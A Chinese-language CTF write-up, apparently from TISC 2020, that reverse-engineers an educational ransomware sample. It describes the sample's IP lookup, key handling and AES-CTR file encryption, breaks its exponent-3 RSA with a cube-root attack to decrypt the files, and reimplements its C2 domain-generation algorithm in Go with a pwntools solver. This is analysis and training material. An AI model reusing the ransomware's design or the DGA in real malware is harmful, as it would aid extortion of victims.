6d8da77f503c9a5560073c13122a903b IN YOUR EMAILYour move,Anor0cW4re Team+++++ +++++ +++++ +++++ +++++ +++++DO NOT BE ALARMED;DO NOT SEND ETHEREUM TO ANY ACCOUNT;THIS IS AN EDUCATIONAL RANSOMWAREFOR CYBER SECURITY TRAINING;+++++ +++++ +++++ +++++ +++++ +++++</code></pre><p>然后,URL<code>https://ifconfig.co/json</code>获取受害者网络的信息，填充了<code>city</code>和<code>ip</code>参数：<br><img src="https://cdn.jsdelivr.net/gh/gscr10/picture/2020-9-24/1600914556056-s3-2.jpg"><br>然后，生成两个随机数，分别代表<code>encryption key``encryption IV</code>：<br><img src="https://cdn.jsdelivr.net/gh/gscr10/picture/2020-9-24/1600914713968-s3-3.jpg"><br>然后，构造JOSN结构数据，包含字段<code>City``EncIV``EncKey``IP``MachineId</code>:<br><img src="https://cdn.jsdelivr.net/gh/gscr10/picture/2020-9-24/1600915179423-s3-4.jpg"><br>随后，对公钥进行解密、编码、解析：<br><img src="https://cdn.jsdelivr.net/gh/gscr10/picture/2020-9-24/1600915318395-s3-5.jpg"><br>接着，对JOSN字段进行URL编码：<br><img src="https://cdn.jsdelivr.net/gh/gscr10/picture/2020-9-24/1600915484079-s3-6.jpg"><br>处理后JOSN数据被转换为一个大数并求幂，可以理解为进行RSA操作：<br><img src="https://cdn.jsdelivr.net/gh/gscr10/picture/2020-9-24/1600915730355-s3-7.jpg"><br>随后，所有的数据将被写入<code>keydetails-enc.txt</code>文件中：<br><img src="https://cdn.jsdelivr.net/gh/gscr10/picture/2020-9-24/1600915970085-s3-8.jpg"><br>与此同时，域名生成算法<code>main.QbznvaAnzrTrarengvbaNytbevguz</code>执行，生成C2域名，并发送报告：<br><img src="https://cdn.jsdelivr.net/gh/gscr10/picture/2020-9-24/1600916218483-s3-9.jpg"><br>最后，通过<code>main.visit.func1</code>函数遍历整个目录，完成所有文件加密：<br><img src="https://cdn.jsdelivr.net/gh/gscr10/picture/2020-9-24/1600916356647-s3-10.jpg"><br>接下来，分析<code>main.visit.func1</code>函数，使用<code>EncKey</code>对AES-128密码进行初始化来对文件加密：<br><img src="https://cdn.jsdelivr.net/gh/gscr10/picture/2020-9-24/1600916613173-s3-11.jpg"><br>通过分析发现，IV并不是一个常量，而是将IV的前两个字节设置为文件名的前两个字节：<br><img src="https://cdn.jsdelivr.net/gh/gscr10/picture/2020-9-24/1600916725702-s3-12.jpg"><br>密码设置为CTR模式，加密数据输出到<code>.anoroc</code>后缀的文件中：<br><img src="https://cdn.jsdelivr.net/gh/gscr10/picture/2020-9-24/1600917117875-s3-13.jpg"><br>分析完毕了整个加密逻辑，为了进行文件解密，首先需要检查公钥：</p><pre class="language-shell" data-language="shell"><code class="language-shell">r10@kali:~/tisc$ openssl rsa -noout -text -inform PEM -in ./pub_key -pubinPublic-Key: <span class="token punctuation">(</span><span class="token number">8192</span> bit<span class="token punctuation">)</span>Modulus:    00:9b:df:5b:da:9b:ed:ad:58:96:fa:33:7f:dc:d1:    5f:c3:c8:37:e9:d4:11:ea:22:6b:f9:cc:91:7b:e9:    3c:5c:5c:ee:1d:43:b8:2c:dd:ed:93:be:ad:15:2f:    03:6d:a0:9c:60:58:ae:7f:c1:ac:ba:07:11:99:00:    c4:ac:f6:5f:aa:09:2f:5d:9a:6e:7d:f7:d3:7e:34:<span class="token punctuation">..</span>.    bf:bb:e3:68:74:a0:23:85:d5:69:88:96:f3:22:77:    <span class="token number">33</span>:49:da:25:5e:29:e2:2b:03:54:2d:6f:15:8e:34:    bd:29:34:91:c2:27:6a:78:e9:24:a4:d7:88:aa:24:    <span class="token number">67</span>:59:3d:d3:4c:c0:0c:cd:be:63:d2:31:06:17:b2:    f7:0c:e3:0f:e9Exponent: <span class="token number">3</span> <span class="token punctuation">(</span>0x3<span class="token punctuation">)</span></code></pre><p>这里指数为3，可以采用<a href="https://crypto.stackexchange.com/questions/33561/cube-root-attack-rsa-with-low-exponent">cube-root attack</a>思路。首先，将密文转换为十六进制：</p><pre class="language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> binasciidata <span class="token operator">=</span> <span class="token builtin">open</span><span class="token punctuation">(</span><span class="token string">"./dockerize/encrypted/keydetails-enc.txt"</span><span class="token punctuation">,</span> <span class="token string">"rb"</span><span class="token punctuation">)</span><span class="token punctuation">.</span>read<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"0x"</span> <span class="token operator">+</span> binascii<span class="token punctuation">.</span>hexlify<span class="token punctuation">(</span>data<span class="token punctuation">)</span><span class="token punctuation">.</span>decode<span class="token punctuation">(</span><span class="token string">"utf-8"</span><span class="token punctuation">)</span><span class="token punctuation">)</span>'</code></pre><pre class="language-shell" data-language="shell"><code class="language-shell">r10@kali:~/tisc$ python conv_hex.py0x04aca8af91f97ef198ba32c820e8868deb693f86f763d3a2879a84fa8e7af6f396107701b480e453ec69b7e3f72f02520f408a98c163db6c70f9902eab87c882b73c158e16be95dc4a9921fec3297586343b250f6cf58f3512e37de84e2f3d12639bec4f88ed5e68226fad6c2e5dbdfe9b44350aaedc61015e8f28cce50a69c67f919f0c5d2c2c9073bf4d25afb299e65acf703880949b32f5e442e77cf527f6a8a3881ba1f94e79103abb9c1a1f55a4735488e05d0a41fd7feb3b7c130c2139dcc4301a55d87806e04f45ce210ecbc971bfaf7a2ff090f39709f4025f658f7729eb1cfbef40cfce7d469d1095f60144e2f312b6493ce0cca3765189089425a04d035cdd6a80b131b231215141ae83f2a3410fc551ca30296be4ad3f7bf4cdb1e09583f97d445150c037f88d7ca765174f8b202b6a5f513dd9f20b430bbbbfc2309293271faac024b38cde3fc22555cd860ef79ae16697982e37650c933ced29879280f2301d7efcc4967dd77e668a65afbc770d46669e67678f347c5d85ffe05218d8ebeec470ca1d74ae8956589db43999a1643a95b0a72acf6ace052fdef8bcc63dc7ce67024866d4e7cb421965218614a41e0789c7239733e6f97c00f1db05bff3e1283e3790a4a9ac2e6f1cfa5084555f4412da28d7434bfa27d6b4cdf4da50889c9285c8ca0e606398bfb3b34894752667df01a28023b7297d3a16978f4a974cf2d04088</code></pre><p>接着可以用Sage计算立方根：</p><pre class="language-python" data-language="python"><code class="language-python"><span class="token keyword">from</span> sage<span class="token punctuation">.</span>crypto<span class="token punctuation">.</span>util <span class="token keyword">import</span> bin_to_ascii<span class="token punctuation">,</span> ascii_to_binc <span class="token operator">=</span> <span class="token number">0x04aca8af91f97ef198ba32c820e8868deb693f86f763d3a2879a84fa8e7af6f396107701b480e45</span><span class="token number">3ec69b7e3f72f02520f408a98c163db6c70f9902eab87c882b73c158e16be95dc4a9921fec3297586343b</span><span class="token number">250f6cf58f3512e37de84e2f3d12639bec4f88ed5e68226fad6c2e5dbdfe9b44350aaedc61015e8f28cce</span><span class="token number">50a69c67f919f0c5d2c2c9073bf4d25afb299e65acf703880949b32f5e442e77cf527f6a8a3881ba1f94e</span><span class="token number">79103abb9c1a1f55a4735488e05d0a41fd7feb3b7c130c2139dcc4301a55d87806e04f45ce210ecbc971b</span>faf7a2ff090f39709f4025f658f7729eb1cfbef40cfce7d469d1095f60144e2f312b6493ce0cca3765189<span class="token number">089425a04d035cdd6a80b131b231215141ae83f2a3410fc551ca30296be4ad3f7bf4cdb1e09583f97d445</span><span class="token number">150c037f88d7ca765174f8b202b6a5f513dd9f20b430bbbbfc2309293271faac024b38cde3fc22555cd86</span><span class="token number">0ef79ae16697982e37650c933ced29879280f2301d7efcc4967dd77e668a65afbc770d46669e67678f347</span>c5d85ffe05218d8ebeec470ca1d74ae8956589db43999a1643a95b0a72acf6ace052fdef8bcc63dc7ce67<span class="token number">024866d4e7cb421965218614a41e0789c7239733e6f97c00f1db05bff3e1283e3790a4a9ac2e6f1cfa508</span><span class="token number">4555f4412da28d7434bfa27d6b4cdf4da50889c9285c8ca0e606398bfb3b34894752667df01a28023b729</span><span class="token number">7d3a16978f4a974cf2d04088</span>ci <span class="token operator">=</span> Integer<span class="token punctuation">(</span>c<span class="token punctuation">)</span>p <span class="token operator">=</span> <span class="token builtin">pow</span><span class="token punctuation">(</span>ci<span class="token punctuation">,</span> <span class="token number">1</span><span class="token operator">/</span><span class="token number">3</span><span class="token punctuation">)</span>pa <span class="token operator">=</span> p<span class="token punctuation">.</span>ceil<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span>binary<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span>bin_to_ascii<span class="token punctuation">(</span><span class="token string">"0"</span> <span class="token operator">+</span> pa<span class="token punctuation">)</span><span class="token punctuation">)</span></code></pre><p>得到<code>EncKey``EndIV</code>等字段的值：</p><pre class="language-txt" data-language="txt"><code class="language-txt">City&#x3D;Singapore&amp;EncIV&#x3D;%1C%9F%A4%9B%2C%9EN%AF%04%9CA%AE%02%86%03%81&amp;EncKey&#x3D;%99z%11%12%7FjD%22%93%D2%A8%EB%1D2u%04&amp;IP&#x3D;112.199.210.119&amp;MachineId&#x3D;6d8da77f503c9a5560073c13122a903b</code></pre><p>编写<code>decrypt_anoroc.py</code>对文件进行解密：</p><pre class="language-python" data-language="python"><code class="language-python"><span class="token keyword">from</span> Crypto<span class="token punctuation">.</span>Cipher <span class="token keyword">import</span> AES<span class="token keyword">from</span> Crypto<span class="token punctuation">.</span>Util <span class="token keyword">import</span> Counter<span class="token keyword">import</span> sys<span class="token keyword">import</span> os<span class="token punctuation">.</span>pathIV <span class="token operator">=</span> <span class="token builtin">bytes</span><span class="token punctuation">.</span>fromhex<span class="token punctuation">(</span><span class="token string">'1c9fa49b2c9e4eaf049c41ae02860381'</span><span class="token punctuation">)</span>KEY <span class="token operator">=</span> <span class="token builtin">bytes</span><span class="token punctuation">.</span>fromhex<span class="token punctuation">(</span><span class="token string">'997a11127f6a442293d2a8eb1d327504'</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    filename <span class="token operator">=</span> sys<span class="token punctuation">.</span>argv<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span>    output <span class="token operator">=</span> sys<span class="token punctuation">.</span>argv<span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">]</span>    data <span class="token operator">=</span> <span class="token builtin">open</span><span class="token punctuation">(</span>filename<span class="token punctuation">,</span> <span class="token string">'rb'</span><span class="token punctuation">)</span><span class="token punctuation">.</span>read<span class="token punctuation">(</span><span class="token punctuation">)</span>    base <span class="token operator">=</span> os<span class="token punctuation">.</span>path<span class="token punctuation">.</span>basename<span class="token punctuation">(</span>filename<span class="token punctuation">)</span>    new_iv <span class="token operator">=</span> base<span class="token punctuation">[</span><span class="token punctuation">:</span><span class="token number">2</span><span class="token punctuation">]</span><span class="token punctuation">.</span>encode<span class="token punctuation">(</span><span class="token string">'utf-8'</span><span class="token punctuation">)</span> <span class="token operator">+</span> IV<span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">:</span><span class="token punctuation">]</span>    cipher <span class="token operator">=</span> AES<span class="token punctuation">.</span>new<span class="token punctuation">(</span>KEY<span class="token punctuation">,</span> AES<span class="token punctuation">.</span>MODE_CTR<span class="token punctuation">,</span> initial_value<span class="token operator">=</span>new_iv<span class="token punctuation">,</span> nonce<span class="token operator">=</span><span class="token string">b''</span><span class="token punctuation">)</span>    mt_bytes <span class="token operator">=</span> cipher<span class="token punctuation">.</span>decrypt<span class="token punctuation">(</span>data<span class="token punctuation">)</span>    <span class="token builtin">open</span><span class="token punctuation">(</span>output<span class="token punctuation">,</span> <span class="token string">'wb'</span><span class="token punctuation">)</span><span class="token punctuation">.</span>write<span class="token punctuation">(</span>mt_bytes<span class="token punctuation">)</span><span class="token keyword">if</span> __name__ <span class="token operator">==</span> <span class="token string">'__main__'</span><span class="token punctuation">:</span>    main<span class="token punctuation">(</span><span class="token punctuation">)</span></code></pre><p>最终在解密后的数据库中找到flag:</p><pre class="language-shell" data-language="shell"><code class="language-shell">r10@kali:~/tisc$ python decrypt_anoroc.py ./encrypted/secret_investments.db.anoroc decrypted/secret_investments.dbr10@kali:~/tisc$ sqlite3 decrypted/secret_investments.dbSQLite version <span class="token number">3.31</span>.1 <span class="token number">2020</span>-01-27 <span class="token number">19</span>:55:54Enter <span class="token string">".help"</span> <span class="token keyword">for</span> usage hints.sqlite<span class="token operator">></span> .schemaCREATE TABLE IF NOT EXISTS <span class="token string">"stocks"</span> <span class="token punctuation">(</span><span class="token string">"id"</span>INTEGER NOT NULL UNIQUE,<span class="token string">"symbol"</span>TEXT,<span class="token string">"shares_held"</span>INTEGER,<span class="token string">"target"</span>INTEGER,PRIMARY KEY<span class="token punctuation">(</span><span class="token string">"id"</span> AUTOINCREMENT<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>CREATE TABLE sqlite_sequence<span class="token punctuation">(</span>name,seq<span class="token punctuation">)</span><span class="token punctuation">;</span>CREATE TABLE IF NOT EXISTS <span class="token string">"ctf_flag"</span> <span class="token punctuation">(</span><span class="token string">"id"</span>INTEGER NOT NULL UNIQUE,<span class="token string">"comp"</span>TEXT,<span class="token string">"flag"</span>TEXT,PRIMARY KEY<span class="token punctuation">(</span><span class="token string">"id"</span> AUTOINCREMENT<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>sqlite<span class="token operator">></span> <span class="token keyword">select</span> * from ctf_flag<span class="token punctuation">;</span><span class="token number">1</span><span class="token operator">|</span>TSIC20<span class="token operator">|</span>TISC20<span class="token punctuation">&#123;</span>u_decrypted_d4_fil3s_w0w_82161874619846<span class="token punctuation">&#125;</span></code></pre><p><strong>Flag:</strong> <code>TISC20&#123;u_decrypted_d4_fil3s_w0w_82161874619846&#125;</code></p><h2 id="Stage-4-Where-is-the-C2"><a href="#Stage-4-Where-is-the-C2" class="headerlink" title="Stage 4: Where is the C2?"></a>Stage 4: Where is the C2?</h2><p><img src="https://cdn.jsdelivr.net/gh/gscr10/picture/2020-9-24/1600918591342-s4-0.jpg"><br>连接服务器得到提示：</p><pre class="language-txt" data-language="txt"><code class="language-txt">$$$$$$$$\ $$$$$$\  $$$$$$\   $$$$$$\\__$$  __|\_$$  _|$$  __$$\ $$  __$$\   $$ |     $$ |  $$ &#x2F;  \__|$$ &#x2F;  \__|   $$ |     $$ |  \$$$$$$\  $$ |   $$ |     $$ |   \____$$\ $$ |   $$ |     $$ |  $$\   $$ |$$ |  $$\   $$ |   $$$$$$\ \$$$$$$  |\$$$$$$  |   \__|   \______| \______&#x2F;  \______&#x2F;CSIT&#39;s The Infosecurity Challenge 2020https:&#x2F;&#x2F;play.tisc.csit-events.sg&#x2F;CHALLENGE 4: WHERE IS THE C2?&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;SUBMISSION_TOKEN? LdWaGOgyfbVQromGEgmzfADJYNpGEPKLUgjiudRJfMoKzpXyklQgNqSxSQeNYGsrWhere (domain name) can we find the ransomware servers on 2054-03-21T16:19:03.000Z?</code></pre><p>在Stage 3中我们分析得到<code>main.QbznvaAnzrTrarengvbaNytbevguz</code>函数生成了C2域名。对该函数进行进一步分析，发现它在端点<code>https://worldtimeapi.org/api/timezone/Etc/UTC.json</code>获取一个JOSN数据并进行编码：<br><img src="https://cdn.jsdelivr.net/gh/gscr10/picture/2020-9-24/1600919147958-s4-1.jpg"><br>该端点返回一堆与时区有关的值：</p><pre class="language-none"><code class="language-none">&#123;   &quot;abbreviation&quot;:&quot;UTC&quot;,   &quot;client_ip&quot;:&quot;&lt;IP ADDRESS&gt;&quot;,   &quot;datetime&quot;:&quot;2020-09-17T21:29:49.031611+00:00&quot;,   &quot;day_of_week&quot;:1,   &quot;day_of_year&quot;:251,   &quot;dst&quot;:false,   &quot;dst_from&quot;:null,   &quot;dst_offset&quot;:0,   &quot;dst_until&quot;:null,   &quot;raw_offset&quot;:0,   &quot;timezone&quot;:&quot;Etc&#x2F;UTC&quot;,   &quot;unixtime&quot;:1599506733,   &quot;utc_datetime&quot;:&quot;2020-09-17T21:29:49.031611+00:00&quot;,   &quot;utc_offset&quot;:&quot;+00:00&quot;,   &quot;week_number&quot;:38&#125;</code></pre><p>为了更好分析，这里将端点地址改为本地<code>localhost</code>:<br><img src="https://cdn.jsdelivr.net/gh/gscr10/picture/2020-9-24/1600919528765-s4-2.jpg"><br>首先，<code>time.now()</code>获取当前系统的时间：<br><img src="https://cdn.jsdelivr.net/gh/gscr10/picture/2020-9-24/1600919630370-s4-3.jpg"><br>然后，JOSN数据中的<code>unixtime</code>字段被获取：<br><img src="https://cdn.jsdelivr.net/gh/gscr10/picture/2020-9-24/1600919768801-s4-4.jpg"><br>随后生成一个随机种子、一个代表域名可变长度的的随机数<code>ath/rand.(*Rand).Intn(0x20)</code>：<br><img src="https://cdn.jsdelivr.net/gh/gscr10/picture/2020-9-24/1600921673034-s4-5.jpg"><br><img src="https://cdn.jsdelivr.net/gh/gscr10/picture/2020-9-24/1600921679064-s4-6.jpg"><br>这个可变长度值被加入到<code>0x20</code>值中组成基本域名的长度：<br><img src="https://cdn.jsdelivr.net/gh/gscr10/picture/2020-9-24/1600925601046-s4-7.jpg"><br>当不满足终止条件时，再计算一个随机值<code>math/rand.(*Rand).Intn(0x539) % 0x24</code>最为字符数字<code>charset</code>的索引，并添加到结果域名的字符串中。这里，<code>charset</code>为<code>kod4y6tgirhzq1pva52jem3sfxw8u9b0ncl7</code>：<br><img src="https://cdn.jsdelivr.net/gh/gscr10/picture/2020-9-24/1600925933507-s4-8.jpg"><br>当满足终止条件时，计算域名的根和前缀：<br><img src="https://cdn.jsdelivr.net/gh/gscr10/picture/2020-9-24/1600926059617-s4-9.jpg"><br>这里有9中不同的根域的可能性：<code>.catbox.moe</code> <code>.cf</code> <code>.ga</code> <code>.gq</code> <code>.mixtape.moe</code> <code>.ml</code> <code>.nyaa.net</code>  <code>.tk</code>  <code>.pomf.io</code> 。<br>编写一个go程序<code>test_random.go</code>来计算所需的域名:</p><pre class="language-go" data-language="go"><code class="language-go"><span class="token keyword">package</span> main<span class="token keyword">import</span> <span class="token punctuation">(</span>    <span class="token string">"fmt"</span>    <span class="token string">"bytes"</span>    <span class="token string">"os"</span>    <span class="token string">"strconv"</span>    <span class="token string">"math/rand"</span><span class="token punctuation">)</span><span class="token keyword">func</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    charset <span class="token operator">:=</span> <span class="token string">"kod4y6tgirhzq1pva52jem3sfxw8u9b0ncl7"</span>    epoch<span class="token punctuation">,</span> <span class="token boolean">_</span> <span class="token operator">:=</span> strconv<span class="token punctuation">.</span><span class="token function">Atoi</span><span class="token punctuation">(</span>os<span class="token punctuation">.</span>Args<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">)</span>    seed <span class="token operator">:=</span> <span class="token function">int64</span><span class="token punctuation">(</span>epoch <span class="token operator">>></span> <span class="token number">0xf</span><span class="token punctuation">)</span>    rand<span class="token punctuation">.</span><span class="token function">Seed</span><span class="token punctuation">(</span>seed<span class="token punctuation">)</span>    lengthener <span class="token operator">:=</span> rand<span class="token punctuation">.</span><span class="token function">Intn</span><span class="token punctuation">(</span><span class="token number">0x20</span><span class="token punctuation">)</span>    buff <span class="token operator">:=</span> bytes<span class="token punctuation">.</span><span class="token function">NewBufferString</span><span class="token punctuation">(</span><span class="token string">""</span><span class="token punctuation">)</span>    <span class="token keyword">for</span> i <span class="token operator">:=</span> <span class="token number">0</span><span class="token punctuation">;</span> i <span class="token operator">&lt;</span> <span class="token punctuation">(</span><span class="token number">0x20</span> <span class="token operator">+</span> lengthener<span class="token punctuation">)</span><span class="token punctuation">;</span> i<span class="token operator">++</span> <span class="token punctuation">&#123;</span>        current_num <span class="token operator">:=</span> rand<span class="token punctuation">.</span><span class="token function">Intn</span><span class="token punctuation">(</span><span class="token number">0x539</span> <span class="token operator">+</span> i<span class="token punctuation">)</span>        current_num <span class="token operator">=</span> current_num <span class="token operator">%</span> <span class="token number">0x24</span>        <span class="token comment">//fmt.Println(current_num)</span>        buff<span class="token punctuation">.</span><span class="token function">WriteByte</span><span class="token punctuation">(</span>charset<span class="token punctuation">[</span>current_num<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">&#125;</span>    root_part <span class="token operator">:=</span> rand<span class="token punctuation">.</span><span class="token function">Intn</span><span class="token punctuation">(</span><span class="token number">0x7a69</span><span class="token punctuation">)</span> <span class="token operator">%</span> <span class="token number">9</span>    <span class="token comment">//fmt.Println(root_part)</span>    parts <span class="token operator">:=</span> <span class="token punctuation">[</span><span class="token operator">...</span><span class="token punctuation">]</span><span class="token builtin">string</span><span class="token punctuation">&#123;</span><span class="token string">".mixtape.moe"</span><span class="token punctuation">,</span> <span class="token string">".catbox.moe"</span><span class="token punctuation">,</span> <span class="token string">".tk"</span><span class="token punctuation">,</span> <span class="token string">".nyaa.net"</span><span class="token punctuation">,</span> <span class="token string">".gq"</span><span class="token punctuation">,</span> <span class="token string">".pomf.io"</span><span class="token punctuation">,</span>    <span class="token string">".cf"</span><span class="token punctuation">,</span> <span class="token string">".ga"</span><span class="token punctuation">,</span> <span class="token string">".ml"</span><span class="token punctuation">&#125;</span>    <span class="token comment">//fmt.Println(root_part)</span>    buff<span class="token punctuation">.</span><span class="token function">WriteString</span><span class="token punctuation">(</span>parts<span class="token punctuation">[</span>root_part<span class="token punctuation">]</span><span class="token punctuation">)</span>    domain <span class="token operator">:=</span> buff<span class="token punctuation">.</span><span class="token function">String</span><span class="token punctuation">(</span><span class="token punctuation">)</span>    fmt<span class="token punctuation">.</span><span class="token function">Println</span><span class="token punctuation">(</span>domain<span class="token punctuation">)</span><span class="token punctuation">&#125;</span></code></pre><p>随后编写python脚本<code>solver.py</code>进行问题的解决：</p><pre class="language-python" data-language="python"><code class="language-python"><span class="token keyword">from</span> pwn <span class="token keyword">import</span> <span class="token operator">*</span><span class="token keyword">from</span> datetime <span class="token keyword">import</span> datetime<span class="token keyword">import</span> pytz<span class="token keyword">def</span> <span class="token function">get_answer</span><span class="token punctuation">(</span>epoch<span class="token punctuation">)</span><span class="token punctuation">:</span>    p <span class="token operator">=</span> process<span class="token punctuation">(</span><span class="token string">"./test_random &#123;&#125;"</span><span class="token punctuation">.</span><span class="token builtin">format</span><span class="token punctuation">(</span>epoch<span class="token punctuation">)</span><span class="token punctuation">,</span> shell<span class="token operator">=</span><span class="token boolean">True</span><span class="token punctuation">)</span>    domain <span class="token operator">=</span> p<span class="token punctuation">.</span>recvall<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span>strip<span class="token punctuation">(</span><span class="token punctuation">)</span>    p<span class="token punctuation">.</span>close<span class="token punctuation">(</span><span class="token punctuation">)</span>    <span class="token keyword">return</span> domain<span class="token keyword">def</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    p <span class="token operator">=</span> remote<span class="token punctuation">(</span><span class="token string">"fqybysahpvift1nqtwywevlr7n50zdzp.ctf.sg"</span><span class="token punctuation">,</span> <span class="token number">31090</span><span class="token punctuation">)</span>    p<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">"SUBMISSION_TOKEN?"</span><span class="token punctuation">)</span>    p<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span><span class="token string">"exIvQfhiaBKjudkvmWrIUoAheGZEjscdPOJClxUJNTFdJbFiguftOlVacIkgQRYG"</span><span class="token punctuation">)</span>    <span class="token keyword">while</span> <span class="token boolean">True</span><span class="token punctuation">:</span>        test_win <span class="token operator">=</span> p<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token punctuation">[</span><span class="token string">"Do you know the domain name at "</span><span class="token punctuation">,</span> <span class="token string">"Winner"</span><span class="token punctuation">]</span><span class="token punctuation">)</span>        <span class="token keyword">if</span> <span class="token string">b"Winner"</span> <span class="token keyword">in</span> test_win<span class="token punctuation">:</span>            <span class="token keyword">print</span><span class="token punctuation">(</span>p<span class="token punctuation">.</span>recvall<span class="token punctuation">(</span><span class="token number">0.5</span><span class="token punctuation">)</span><span class="token punctuation">)</span>            <span class="token keyword">return</span>        timing <span class="token operator">=</span> p<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">"Coordinated Universal Time"</span><span class="token punctuation">)</span>        timing <span class="token operator">=</span> timing<span class="token punctuation">.</span>replace<span class="token punctuation">(</span><span class="token string">b" Coordinated Universal Time"</span><span class="token punctuation">,</span> <span class="token string">b""</span><span class="token punctuation">)</span>        p<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">"connects to?"</span><span class="token punctuation">)</span>        parsed_d <span class="token operator">=</span> datetime<span class="token punctuation">.</span>strptime<span class="token punctuation">(</span>timing<span class="token punctuation">.</span>decode<span class="token punctuation">(</span><span class="token string">"utf-8"</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token string">"%B %d, %Y, %I:%M:%S %p"</span><span class="token punctuation">)</span>        parsed_d <span class="token operator">=</span> pytz<span class="token punctuation">.</span>utc<span class="token punctuation">.</span>localize<span class="token punctuation">(</span>parsed_d<span class="token punctuation">)</span>        epoch <span class="token operator">=</span> <span class="token builtin">int</span><span class="token punctuation">(</span>parsed_d<span class="token punctuation">.</span>timestamp<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span>        answer <span class="token operator">=</span> get_answer<span class="token punctuation">(</span>epoch<span class="token punctuation">)</span>        p<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>answer<span class="token punctuation">)</span>        <span class="token keyword">print</span><span class="token punctuation">(</span>answer<span class="token punctuation">)</span>    p<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token keyword">if</span> __name__ <span class="token operator">==</span> <span class="token string">'__main__'</span><span class="token punctuation">:</span>    main<span class="token punctuation">(</span><span class="token punctuation">)</span></code></pre><p>运行脚本解决该题目：</p><pre class="language-shell" data-language="shell"><code class="language-shell">r10@kali:~/tisc$ python solver.py<span class="token punctuation">[</span>+<span class="token punctuation">]</span> Opening connection to fqybysahpvift1nqtwywevlr7n50zdzp.ctf.sg on port <span class="token number">31090</span>: Done<span class="token punctuation">[</span>+<span class="token punctuation">]</span> Starting <span class="token builtin class-name">local</span> process <span class="token string">'/bin/sh'</span><span class="token builtin class-name">:</span> pid <span class="token number">18545</span><span class="token punctuation">[</span>+<span class="token punctuation">]</span> Receiving all data: Done <span class="token punctuation">(</span>49B<span class="token punctuation">)</span><span class="token punctuation">[</span>*<span class="token punctuation">]</span> Process <span class="token string">'/bin/sh'</span> stopped with <span class="token builtin class-name">exit</span> code <span class="token number">0</span> <span class="token punctuation">(</span>pid <span class="token number">18545</span><span class="token punctuation">)</span>b<span class="token string">'ctoi9uj4lt0grfqozyqh0smh6do1onaqf35vj8fg81b8c.cf'</span><span class="token punctuation">[</span>+<span class="token punctuation">]</span> Starting <span class="token builtin class-name">local</span> process <span class="token string">'/bin/sh'</span><span class="token builtin class-name">:</span> pid <span class="token number">18546</span><span class="token punctuation">[</span>+<span class="token punctuation">]</span> Receiving all data: Done <span class="token punctuation">(</span>50B<span class="token punctuation">)</span><span class="token punctuation">[</span>*<span class="token punctuation">]</span> Process <span class="token string">'/bin/sh'</span> stopped with <span class="token builtin class-name">exit</span> code <span class="token number">0</span> <span class="token punctuation">(</span>pid <span class="token number">18546</span><span class="token punctuation">)</span>b<span class="token string">'evp92cfszcejb3ac0t5o0sn7zb3z2nf89zztftu1kxt7nb.ga'</span><span class="token punctuation">[</span>+<span class="token punctuation">]</span> Starting <span class="token builtin class-name">local</span> process <span class="token string">'/bin/sh'</span><span class="token builtin class-name">:</span> pid <span class="token number">18547</span><span class="token punctuation">[</span>+<span class="token punctuation">]</span> Receiving all data: Done <span class="token punctuation">(</span>56B<span class="token punctuation">)</span><span class="token punctuation">[</span>*<span class="token punctuation">]</span> Process <span class="token string">'/bin/sh'</span> stopped with <span class="token builtin class-name">exit</span> code <span class="token number">0</span> <span class="token punctuation">(</span>pid <span class="token number">18547</span><span class="token punctuation">)</span>b<span class="token string">'nhiz9blh6n1tut9s4w5mbk3lyh6vur80cvf2k6ttee3u.catbox.moe'</span><span class="token punctuation">[</span>+<span class="token punctuation">]</span> Starting <span class="token builtin class-name">local</span> process <span class="token string">'/bin/sh'</span><span class="token builtin class-name">:</span> pid <span class="token number">18548</span><span class="token punctuation">[</span>+<span class="token punctuation">]</span> Receiving all data: Done <span class="token punctuation">(</span>47B<span class="token punctuation">)</span><span class="token punctuation">[</span>*<span class="token punctuation">]</span> Process <span class="token string">'/bin/sh'</span> stopped with <span class="token builtin class-name">exit</span> code <span class="token number">0</span> <span class="token punctuation">(</span>pid <span class="token number">18548</span><span class="token punctuation">)</span>b<span class="token string">'2yuowtvj496xbdeu9omxrb86qfb4x3ttula7s.nyaa.net'</span><span class="token punctuation">..</span>.<span class="token punctuation">[</span>+<span class="token punctuation">]</span> Starting <span class="token builtin class-name">local</span> process <span class="token string">'/bin/sh'</span><span class="token builtin class-name">:</span> pid <span class="token number">18644</span><span class="token punctuation">[</span>+<span class="token punctuation">]</span> 